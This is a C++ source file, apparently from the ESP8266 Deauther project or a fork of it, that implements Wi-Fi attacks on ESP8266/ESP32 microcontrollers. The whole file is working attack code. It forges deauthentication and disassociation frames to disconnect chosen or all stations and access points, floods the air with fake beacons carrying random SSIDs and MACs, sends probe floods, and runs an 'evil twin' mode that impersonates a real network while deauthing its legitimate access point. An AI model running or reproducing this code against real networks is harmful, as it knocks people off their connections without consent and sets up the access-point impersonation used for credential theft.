/* This software is licensed under the MIT License: https://github.com/spacehuhntech/esp8266_deauther */

#include "Attack.h"

#ifdef ESP32
    #include <esp_wifi.h>
#endif

#include "settings.h"

Attack::Attack() {
    getRandomMac(mac);

    if (settings::getAttackSettings().beacon_interval == INTERVAL_1S) {
        // 1s beacon interval
        beaconPacket[32] = 0xe8;
        beaconPacket[33] = 0x03;
    } else {
        // 100ms beacon interval
        beaconPacket[32] = 0x64;
        beaconPacket[33] = 0x00;
    }

    deauth.time = currentTime;
    beacon.time = currentTime;
    probe.time  = currentTime;
}

void Attack::start() {
    stop();
    prntln(A_START);
    attackTime      = currentTime;
    attackStartTime = currentTime;
    accesspoints.sortAfterChannel();
    stations.sortAfterChannel();
    running = true;
}

void Attack::start(bool beacon, bool deauth, bool deauthAll, bool probe, bool output, uint32_t timeout) {
    Attack::beacon.active = beacon;
    Attack::deauth.active = deauth || deauthAll;
    Attack::deauthAll     = deauthAll;
    Attack::probe.active  = probe;
    Attack::trueDeauth    = deauthAll;

    Attack::output  = output;
    Attack::timeout = timeout;

    if (beacon || probe || deauthAll || deauth) {
        start();
    } else {
        prntln(A_NO_MODE_ERROR);
        accesspoints.sort();
        stations.sort();
        stop();
    }
}

void Attack::startEvilTwin(const char* ssid, uint8_t ch, bool wpa2, const uint8_t* mac) {
    stop();
    evilTwin = true;
    evilTwinSSID = ssid;
    evilTwinChannel = ch;
    evilTwinWPA2 = wpa2;
    prntln(A_EVIL_TWIN_START);
    attackTime      = currentTime;
    attackStartTime = currentTime;
    running = true;
}

void Attack::stop() {
    if (running) {
        running              = false;
        deauthPkts           = 0;
        beaconPkts           = 0;
        probePkts            = 0;
        deauth.packetCounter = 0;
        beacon.packetCounter = 0;
        probe.packetCounter  = 0;
        deauth.maxPkts       = 0;
        beacon.maxPkts       = 0;
        probe.maxPkts        = 0;
        packetRate           = 0;
        deauth.tc            = 0;
        beacon.tc            = 0;
        probe.tc             = 0;
        deauth.active        = false;
        beacon.active        = false;
        probe.active         = false;
        evilTwin             = false;
        trueDeauth           = false;
        beaconSpam           = false;
        beaconSpamPkts       = 0;
        prntln(A_STOP);
    }
}

bool Attack::isRunning() {
    return running;
}

bool Attack::isEvilTwinRunning() {
    return evilTwin;
}

void Attack::updateCounter() {
    // stop when timeout is active and time is up
    if ((timeout > 0) && (currentTime - attackStartTime >= timeout)) {
        prntln(A_TIMEOUT);
        stop();
        return;
    }

    // deauth packets per second
    if (deauth.active) {
        if (deauthAll) deauth.maxPkts = settings::getAttackSettings().deauths_per_target *
                                        (accesspoints.count() + stations.count() * 2 - names.selected());
        else deauth.maxPkts = settings::getAttackSettings().deauths_per_target *
                              (accesspoints.selected() + stations.selected() * 2 + names.selected() + names.stations());
    } else {
        deauth.maxPkts = 0;
    }

    // beacon packets per second
    if (beacon.active) {
        beacon.maxPkts = ssids.count();

        if (settings::getAttackSettings().beacon_interval == INTERVAL_100MS) beacon.maxPkts *= 10;
    } else {
        beacon.maxPkts = 0;
    }

    // probe packets per second
    if (probe.active) probe.maxPkts = ssids.count() * settings::getAttackSettings().probe_frames_per_ssid;
    else probe.maxPkts = 0;

    // random transmission power
    if (settings::getAttackSettings().random_tx && (beacon.active || probe.active)) setOutputPower(random(21));
    else setOutputPower(20.5f);

    // reset counters
    deauthPkts           = deauth.packetCounter;
    beaconPkts           = beacon.packetCounter;
    probePkts            = probe.packetCounter;
    packetRate           = tmpPacketRate;
    deauth.packetCounter = 0;
    beacon.packetCounter = 0;
    probe.packetCounter  = 0;
    deauth.tc            = 0;
    beacon.tc            = 0;
    probe.tc             = 0;
    tmpPacketRate        = 0;
}

void Attack::status() {
    char s[120];

    sprintf(s, str(
                A_STATUS).c_str(), packetRate, deauthPkts, deauth.maxPkts, beaconPkts, beacon.maxPkts, probePkts,
            probe.maxPkts);
    prnt(String(s));
}

String Attack::getStatusJSON() {
    String json = String(OPEN_BRACKET);                                                                          // [

    json += String(OPEN_BRACKET) + b2s(deauth.active) + String(COMMA) + String(scan.countSelected()) + String(COMMA) +
            String(deauthPkts) + String(COMMA) + String(deauth.maxPkts) + String(CLOSE_BRACKET) + String(COMMA); // [false,0,0,0],
    json += String(OPEN_BRACKET) + b2s(beacon.active) + String(COMMA) + String(ssids.count()) + String(COMMA) + String(
        beaconPkts) + String(COMMA) + String(beacon.maxPkts) + String(CLOSE_BRACKET) + String(COMMA);            // [false,0,0,0],
    json += String(OPEN_BRACKET) + b2s(probe.active) + String(COMMA) + String(ssids.count()) + String(COMMA) + String(
        probePkts) + String(COMMA) + String(probe.maxPkts) + String(CLOSE_BRACKET) + String(COMMA);              // [false,0,0,0],
    json += String(packetRate);                                                                                  // 0
    json += CLOSE_BRACKET;                                                                                       // ]

    return json;
}

void Attack::update() {
    if (!running || scan.isScanning()) return;

    apCount = accesspoints.count();
    stCount = stations.count();
    nCount  = names.count();

    deauthUpdate();
    deauthAllUpdate();
    beaconUpdate();
    probeUpdate();
    
    if (evilTwin) evilTwinUpdate();
    if (trueDeauth) trueDeauthUpdate();
    if (beaconSpam) beaconSpamUpdate();

    if (currentTime - attackTime > 1000) {
        attackTime = currentTime;
        updateCounter();

        if (output) status();
        getRandomMac(mac);
    }
}

void Attack::deauthUpdate() {
    if (!deauthAll && deauth.active && (deauth.maxPkts > 0) && (deauth.packetCounter < deauth.maxPkts)) {
        if (deauth.time <= currentTime - (1000 / deauth.maxPkts)) {
            // APs
            if ((apCount > 0) && (deauth.tc < apCount)) {
                if (accesspoints.getSelected(deauth.tc)) {
                    deauth.tc += deauthAP(deauth.tc);
                } else deauth.tc++;
            }

            // Stations
            else if ((stCount > 0) && (deauth.tc >= apCount) && (deauth.tc < stCount + apCount)) {
                if (stations.getSelected(deauth.tc - apCount)) {
                    deauth.tc += deauthStation(deauth.tc - apCount);
                } else deauth.tc++;
            }

            // Names
            else if ((nCount > 0) && (deauth.tc >= apCount + stCount) && (deauth.tc < nCount + stCount + apCount)) {
                if (names.getSelected(deauth.tc - stCount - apCount)) {
                    deauth.tc += deauthName(deauth.tc - stCount - apCount);
                } else deauth.tc++;
            }

            // reset counter
            if (deauth.tc >= nCount + stCount + apCount) deauth.tc = 0;
        }
    }
}

void Attack::deauthAllUpdate() {
    if (deauthAll && deauth.active && (deauth.maxPkts > 0) && (deauth.packetCounter < deauth.maxPkts)) {
        if (deauth.time <= currentTime - (1000 / deauth.maxPkts)) {
            // APs
            if ((apCount > 0) && (deauth.tc < apCount)) {
                tmpID = names.findID(accesspoints.getMac(deauth.tc));

                if (tmpID < 0) {
                    deauth.tc += deauthAP(deauth.tc);
                } else if (!names.getSelected(tmpID)) {
                    deauth.tc += deauthAP(deauth.tc);
                } else deauth.tc++;
            }

            // Stations
            else if ((stCount > 0) && (deauth.tc >= apCount) && (deauth.tc < stCount + apCount)) {
                tmpID = names.findID(stations.getMac(deauth.tc - apCount));

                if (tmpID < 0) {
                    deauth.tc += deauthStation(deauth.tc - apCount);
                } else if (!names.getSelected(tmpID)) {
                    deauth.tc += deauthStation(deauth.tc - apCount);
                } else deauth.tc++;
            }

            // Names
            else if ((nCount > 0) && (deauth.tc >= apCount + stCount) && (deauth.tc < apCount + stCount + nCount)) {
                if (!names.getSelected(deauth.tc - apCount - stCount)) {
                    deauth.tc += deauthName(deauth.tc - apCount - stCount);
                } else deauth.tc++;
            }

            // reset counter
            if (deauth.tc >= nCount + stCount + apCount) deauth.tc = 0;
        }
    }
}

void Attack::probeUpdate() {
    if (probe.active && (probe.maxPkts > 0) && (probe.packetCounter < probe.maxPkts)) {
        if (probe.time <= currentTime - (1000 / probe.maxPkts)) {
            if (settings::getAttackSettings().attack_all_ch) setWifiChannel(probe.tc % 11, true);
            probe.tc += sendProbe(probe.tc);

            if (probe.tc >= ssids.count()) probe.tc = 0;
        }
    }
}

void Attack::beaconUpdate() {
    if (beacon.active && (beacon.maxPkts > 0) && (beacon.packetCounter < beacon.maxPkts)) {
        if (beacon.time <= currentTime - (1000 / beacon.maxPkts)) {
            beacon.tc += sendBeacon(beacon.tc);

            if (beacon.tc >= ssids.count()) beacon.tc = 0;
        }
    }
}

bool Attack::deauthStation(int num) {
    return deauthDevice(stations.getAPMac(num), stations.getMac(num), settings::getAttackSettings().deauth_reason, stations.getCh(num));
}

bool Attack::deauthAP(int num) {
    return deauthDevice(accesspoints.getMac(num), broadcast, settings::getAttackSettings().deauth_reason, accesspoints.getCh(num));
}

bool Attack::deauthName(int num) {
    if (names.isStation(num)) {
        return deauthDevice(names.getBssid(num), names.getMac(num), settings::getAttackSettings().deauth_reason, names.getCh(num));
    } else {
        return deauthDevice(names.getMac(num), broadcast, settings::getAttackSettings().deauth_reason, names.getCh(num));
    }
}

bool Attack::deauthDevice(uint8_t* apMac, uint8_t* stMac, uint8_t reason, uint8_t ch) {
    if (!stMac) return false;  // exit when station mac is null

    // Serial.println("Deauthing "+macToStr(apMac)+" -> "+macToStr(stMac)); // for debugging

    bool success = false;

    // build deauth packet
    packetSize = sizeof(deauthPacket);

    uint8_t deauthpkt[packetSize];

    memcpy(deauthpkt, deauthPacket, packetSize);

    memcpy(&deauthpkt[4], stMac, 6);
    memcpy(&deauthpkt[10], apMac, 6);
    memcpy(&deauthpkt[16], apMac, 6);
    deauthpkt[24] = reason;

    // send deauth frame
    deauthpkt[0] = 0xc0;

    if (sendPacket(deauthpkt, packetSize, ch, true)) {
        success = true;
        deauth.packetCounter++;
    }

    // send disassociate frame
    uint8_t disassocpkt[packetSize];

    memcpy(disassocpkt, deauthpkt, packetSize);

    disassocpkt[0] = 0xa0;

    if (sendPacket(disassocpkt, packetSize, ch, false)) {
        success = true;
        deauth.packetCounter++;
    }

    // send another packet, this time from the station to the accesspoint
    if (!macBroadcast(stMac)) { // but only if the packet isn't a broadcast
        // build deauth packet
        memcpy(&disassocpkt[4], apMac, 6);
        memcpy(&disassocpkt[10], stMac, 6);
        memcpy(&disassocpkt[16], stMac, 6);

        // send deauth frame
        disassocpkt[0] = 0xc0;

        if (sendPacket(disassocpkt, packetSize, ch, false)) {
            success = true;
            deauth.packetCounter++;
        }

        // send disassociate frame
        disassocpkt[0] = 0xa0;

        if (sendPacket(disassocpkt, packetSize, ch, false)) {
            success = true;
            deauth.packetCounter++;
        }
    }

    if (success) deauth.time = currentTime;

    return success;
}

bool Attack::sendBeacon(uint8_t tc) {
    if (settings::getAttackSettings().attack_all_ch) setWifiChannel(tc % 11, true);
    mac[5] = tc;
    return sendBeacon(mac, ssids.getName(tc).c_str(), wifi_channel, ssids.getWPA2(tc));
}

bool Attack::sendBeacon(uint8_t* mac, const char* ssid, uint8_t ch, bool wpa2) {
    packetSize = sizeof(beaconPacket);

    if (wpa2) {
        beaconPacket[34] = 0x31;
    } else {
        beaconPacket[34] = 0x21;
        packetSize      -= 26;
    }

    int ssidLen = strlen(ssid);

    if (ssidLen > 32) ssidLen = 32;

    memcpy(&beaconPacket[10], mac, 6);
    memcpy(&beaconPacket[16], mac, 6);
    memcpy(&beaconPacket[38], ssid, ssidLen);

    beaconPacket[82] = ch;

    // =====
    uint16_t tmpPacketSize = (packetSize - 32) + ssidLen;                // calc size
    uint8_t* tmpPacket     = new uint8_t[tmpPacketSize];                 // create packet buffer

    memcpy(&tmpPacket[0], &beaconPacket[0], 38 + ssidLen);               // copy first half of packet into buffer
    tmpPacket[37] = ssidLen;                                             // update SSID length byte
    memcpy(&tmpPacket[38 + ssidLen], &beaconPacket[70], wpa2 ? 39 : 13); // copy second half of packet into buffer

    bool success = sendPacket(tmpPacket, tmpPacketSize, ch, false);

    if (success) {
        beacon.time = currentTime;
        beacon.packetCounter++;
    }

    delete[] tmpPacket; // free memory of allocated buffer

    return success;
    // =====
}

bool Attack::sendProbe(uint8_t tc) {
    if (settings::getAttackSettings().attack_all_ch) setWifiChannel(tc % 11, true);
    mac[5] = tc;
    return sendProbe(mac, ssids.getName(tc).c_str(), wifi_channel);
}

bool Attack::sendProbe(uint8_t* mac, const char* ssid, uint8_t ch) {
    packetSize = sizeof(probePacket);
    int ssidLen = strlen(ssid);

    if (ssidLen > 32) ssidLen = 32;

    memcpy(&probePacket[10], mac, 6);
    memcpy(&probePacket[26], ssid, ssidLen);

    if (sendPacket(probePacket, packetSize, ch, false)) {
        probe.time = currentTime;
        probe.packetCounter++;
        return true;
    }

    return false;
}

bool Attack::sendPacket(uint8_t* packet, uint16_t packetSize, uint8_t ch, bool force_ch) {
    // Serial.println(bytesToStr(packet, packetSize));

    // set channel
    setWifiChannel(ch, force_ch);

    // sent out packet
    bool sent = false;
#ifdef ESP32
    sent = esp_wifi_80211_tx(WIFI_IF_AP, packet, packetSize, false) == ESP_OK;
#else
    sent = wifi_send_pkt_freedom(packet, packetSize, 0) == 0;
#endif

    if (sent) ++tmpPacketRate;

    return sent;
}

void Attack::enableOutput() {
    output = true;
    prntln(A_ENABLED_OUTPUT);
}

void Attack::disableOutput() {
    output = false;
    prntln(A_DISABLED_OUTPUT);
}

uint32_t Attack::getDeauthPkts() {
    return deauthPkts;
}

uint32_t Attack::getBeaconPkts() {
    return beaconPkts;
}

uint32_t Attack::getProbePkts() {
    return probePkts;
}

uint32_t Attack::getDeauthMaxPkts() {
    return deauth.maxPkts;
}

uint32_t Attack::getBeaconMaxPkts() {
    return beacon.maxPkts;
}

uint32_t Attack::getProbeMaxPkts() {
    return probe.maxPkts;
}

uint32_t Attack::getPacketRate() {
    return packetRate;
}

void Attack::evilTwinUpdate() {
    if (!evilTwin || accesspoints.count() == 0) return;
    
    setWifiChannel(evilTwinChannel, true);
    
    if (beacon.time <= currentTime - 100) {
        uint8_t fakeMac[6];
        getRandomMac(fakeMac);
        sendBeacon(fakeMac, evilTwinSSID.c_str(), evilTwinChannel, evilTwinWPA2);
        beacon.time = currentTime;
    }
    
    if (deauth.active) {
        for (int i = 0; i < apCount; i++) {
            if (accesspoints.getSelected(i)) {
                deauthAP(i);
            }
        }
    }
}

void Attack::trueDeauthUpdate() {
    if (!trueDeauth) return;
    
    uint32_t maxPkts = settings::getAttackSettings().deauths_per_target * (accesspoints.count() + stations.count());
    uint32_t interval = 1000 / maxPkts;
    
    if (deauth.time <= currentTime - interval) {
        for (int i = 0; i < apCount; i++) {
            if (accesspoints.getSelected(i)) {
                deauthAP(i);
            }
        }
        for (int i = 0; i < stCount; i++) {
            if (stations.getSelected(i)) {
                deauthStation(i);
            }
        }
        deauth.time = currentTime;
    }
}

void Attack::startBeaconSpam(int apCount, uint8_t ch) {
    stop();
    running = true;
    beaconSpam = true;
    beaconSpamCount = apCount;
    wifi_channel = ch;
    beaconSpamPkts = 0;
    attackStartTime = currentTime;
    
    if (output) {
        prntln("Starting Beacon Spam...");
        prnt("Sending ");
        prnt(apCount);
        prntln(" fake APs");
    }
}

void Attack::beaconSpamUpdate() {
    if (!beaconSpam) return;
    
    if (beaconSpamPkts == 0 || currentTime - beacon.time >= 1) {
        uint8_t fakeMac[6];
        char ssid[33];
        
        for (int i = 0; i < beaconSpamCount; i++) {
            getRandomMac(fakeMac);
            
            int ssidLen = random(8, 33);
            for (int j = 0; j < ssidLen; j++) {
                ssid[j] = random(32, 127);
            }
            ssid[ssidLen] = '\0';
            
            sendBeacon(fakeMac, ssid, wifi_channel, random(0, 2) == 1);
        }
        
        beacon.time = currentTime;
        beaconSpamPkts += beaconSpamCount;
    }
}

bool Attack::isBeaconSpamRunning() {
    return beaconSpam;
}

uint32_t Attack::getBeaconSpamPkts() {
    return beaconSpamPkts;
}